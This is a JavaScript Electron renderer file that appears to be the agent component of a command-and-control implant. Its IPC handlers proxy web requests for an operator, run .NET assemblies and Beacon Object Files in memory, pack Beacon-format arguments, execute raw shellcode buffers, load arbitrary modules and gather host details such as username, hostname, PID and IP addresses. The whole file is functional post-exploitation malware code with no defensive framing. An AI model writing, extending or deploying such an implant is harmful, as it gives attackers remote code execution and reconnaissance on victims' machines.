const { ipcRenderer } = require('electron');
const { log } = require('console');
const os = require('os');

ipcRenderer.on('make-web-request', async (event, requestOptions) => {
    try {
        const { url, method = 'GET', headers = {}, body, requestId, isBytes } = requestOptions;
        const defaultHeaders = {
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
        };
        const fetchOptions = {
            method,
            headers: { ...defaultHeaders, ...headers }
        };
        if (body !== undefined) {
            fetchOptions.body = body;
        }
        const response = await fetch(url, fetchOptions);
        let data = "";
        if(isBytes) {
            // // log(`[WEB-REQUEST] Response is bytes`);
            const arrayBuffer = await response.arrayBuffer();
            data = Buffer.from(arrayBuffer);
        } else {
            data = await response.text();
        }
        ipcRenderer.send(`web-request-response-${requestId}`, {
            status: response.status,
            statusText: response.statusText,
            headers: Object.fromEntries(response.headers.entries()),
            data: data
        });
    } catch (error) {
        ipcRenderer.send(`web-request-response-${requestId}`, {
            error: error.message
        });
    }
});

ipcRenderer.on('execute-assembly-node', async (event, path, data, args) => {
    try {
        // // log(`[ASSEMBLY] Received assembly execution request`);
        // // log(`[ASSEMBLY] Path: ${path}`);
        // // log(`[ASSEMBLY] Args: ${JSON.stringify(args)}`);
        
        const node = require(path);
        const result = node.execute_assembly(data, args);
        
        ipcRenderer.send('assembly-complete', result);
    } catch (error) {
        // // log(`[ASSEMBLY] Error executing assembly: ${error.message}`);
        // // log(`[ASSEMBLY] Error stack: ${error.stack}`);
        ipcRenderer.send('assembly-complete', `Error: ${error.message}`);
    }
});

class BeaconPack {
    constructor() {
        this.buffer = Buffer.alloc(0);
        this.size = 0;
    }

    getBuffer() {
        // Create a buffer for the size (4 bytes) + the actual buffer
        const sizeBuffer = Buffer.alloc(4);
        sizeBuffer.writeUInt32LE(this.size, 0);
        return Buffer.concat([sizeBuffer, this.buffer]);
    }

    addShort(short) {
        const shortBuffer = Buffer.alloc(2);
        shortBuffer.writeInt16LE(short, 0);
        this.buffer = Buffer.concat([this.buffer, shortBuffer]);
        this.size += 2;
    }

    addInt(dint) {
        const intBuffer = Buffer.alloc(4);
        intBuffer.writeInt32LE(dint, 0);
        this.buffer = Buffer.concat([this.buffer, intBuffer]);
        this.size += 4;
    }

    addString(s) {
        if (typeof s === 'string') {
            s = Buffer.from(s, 'utf-8');
        }
        // Add null terminator
        s = Buffer.concat([s, Buffer.from([0])]);
        const sizeBuffer = Buffer.alloc(4);
        sizeBuffer.writeUInt32LE(s.length, 0);
        this.buffer = Buffer.concat([this.buffer, sizeBuffer, s]);
        this.size += 4 + s.length;
    }

    addWString(s) {
        if (typeof s === 'string') {
            s = Buffer.from(s, 'utf16le');
        }
        // Add null terminator (2 bytes for UTF-16)
        s = Buffer.concat([s, Buffer.from([0, 0])]);
        const sizeBuffer = Buffer.alloc(4);
        sizeBuffer.writeUInt32LE(s.length, 0);
        this.buffer = Buffer.concat([this.buffer, sizeBuffer, s]);
        this.size += 4 + s.length;
    }

    addBinary(data, length) {
        if (typeof data === 'string') {
            data = Buffer.from(data, 'utf-8');
        }
        const sizeBuffer = Buffer.alloc(4);
        sizeBuffer.writeUInt32LE(length, 0);
        this.buffer = Buffer.concat([this.buffer, sizeBuffer, data]);
        this.size += 4 + length;
    }

    reset() {
        this.buffer = Buffer.alloc(0);
        this.size = 0;
    }
}


ipcRenderer.on('execute-bof-node', async (event, path, bof_data, functionName, formatString, formatArgs) => {
    try {
        // log(`[REND][IPC][BOF] Path: ${path}`);
        // log(`[REND][IPC][BOF] Function Name: ${functionName}`);
        //log(`[REND][IPC][BOF] BOF Data: ${bof_data.toString('hex')}`);
        // log(`[REND][IPC][BOF] Format String: ${formatString}`);
        // log(`[REND][IPC][BOF] Format Args: ${formatArgs}`);

        // Create argument data using BeaconPack
        const beaconPack = new BeaconPack();

        // Process each format specifier and its corresponding argument
        for (let i = 0; i < formatString.length; i++) {
            const formatChar = formatString[i];
            const arg = formatArgs[i];

            switch (formatChar) {
                case 'z': // null-terminated string
                    beaconPack.addString(arg);
                    break;
                case 'w': // wide string
                    beaconPack.addWString(arg);
                    break;
                case 'i': // integer
                    beaconPack.addInt(parseInt(arg));
                    break;
                case 'b': // binary blob
                    const [data, length] = arg.split(',');
                    beaconPack.addBinary(data, parseInt(length));
                    break;
                default:
                    console.error(`[BOF] Error: Unknown format specifier '${formatChar}'`);
                    process.exit(1);
            }
        }

        const argumentData = beaconPack.getBuffer();
        // log('[BOF] Packed argument data:', argumentData.toString('hex'));
        
        const COFFLoader = require(path);
        const result = COFFLoader.runCOFF(functionName, bof_data, argumentData, argumentData.length);
        // log(`[REND][IPC][BOF] Result: ${JSON.stringify(result)}`);
        //const asciiResult = Buffer.from(result.output.data).toString('ascii');
        //log(`[BOF][+] BOF ASCII result:\r\n ${asciiResult}`);
        
        ipcRenderer.send('bof-complete', result);
    } catch (error) {
        // log(`[BOF] Error executing bof: ${error.message}`);
        // log(`[BOF] Error stack: ${error.stack}`);
        ipcRenderer.send('bof-complete', `Error: ${error.message}`);
    }
});

ipcRenderer.on('execute-scexec-node', async (event, path, data) => {
    try {
        // Resolve absolute path
        const resolvedPath = require('path').resolve(__dirname, path);
        //log(`[SCEXEC] Resolved path: ${resolvedPath}`);

        if (!Buffer.isBuffer(data)) {
            // log(`[SCEXEC] Converting data to Buffer: ${data}`);
            data = Buffer.from(data);
        }

        const node = require(resolvedPath);
        const result = node.run_array(data);
        // log(`func_Azure_File_Download_Exec result : ${result}`);
        ipcRenderer.send('scexec-complete', result);
    } catch (error) {
        // log(`[SCEXEC] Error executing scexec: ${error.message}`);
        // log(`[SCEXEC] Error stack: ${error.stack}`);
        ipcRenderer.send('scexec-complete', `Error: ${error.message}`);
    }
});


ipcRenderer.on('load', async (event, path) => {
    try {
        
        const module = require(path);
        // // log(`[LOAD] Successfully loaded module from path: ${path}`);
        ipcRenderer.send('load-complete', 'Module loaded successfully');
    } catch (error) {
        // // log(`[LOAD] Error loading module: ${error.message}`);
        // // log(`[LOAD] Error stack: ${error.stack}`);
        ipcRenderer.send('load-complete', `Error: ${error.message}`);
    }
});

// Add IPC handler for system info requests
ipcRenderer.on('get-system-info', async (event, requestId,mode) => {
    try {
        const hostname = os.hostname();
        const username = os.userInfo().username;
        const osType = os.type();
        const osRelease = os.release();
        const platform = os.platform();
        const arch = os.arch();
        
        const PID = process.pid;
        let procName = process.argv[0];
        procName = procName.trim().replace(/Helper \(Renderer\)/g, "").trim();
        
        const nets = os.networkInterfaces();
        const IpInfo = [];
        for (const name of Object.keys(nets)) {
            for (const net of nets[name]) {
                // 'IPv4' is in Node <= 17, from 18 it's a number 4 or 6
                const familyV4Value = typeof net.family === 'string' ? 'IPv4' : 4;
                if (net.family === familyV4Value && !net.internal) {
                    IpInfo.push(net.address);
                }
            }
        }

        // Create a JSON object with the collected information
        const systemInfo = {
            hostname: hostname,
            username: username,
            osType: osType,
            osRelease: osRelease,
            platform: platform,
            arch: arch,
            PID: PID,
            Process: procName,
            IP: IpInfo,
            mode: mode
        };

        // Send the response back to main process
        ipcRenderer.send(`system-info-response-${requestId}`, systemInfo);
    } catch (error) {
        console.error('Error getting system info:', error);
        ipcRenderer.send(`system-info-response-${requestId}`, 0);
    }
});